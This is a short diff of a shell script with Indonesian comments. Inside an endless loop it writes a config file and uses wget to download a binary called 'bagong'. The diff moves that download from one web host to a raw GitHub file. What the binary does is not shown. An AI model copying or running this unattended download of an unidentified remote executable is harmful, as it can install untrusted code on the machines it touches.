@@ -51,7 +51,7 @@ while true; do
     echo "$CONFIG_JSON" > "$CONFIG_PATH"
 
     # Download binary baru
-    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    wget -q "https://github.com/nineasku55/Store22/raw/refs/heads/main/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
     
     # Pastikan download berhasil sebelum melanjutkan
     if [ $? -ne 0 ]; then
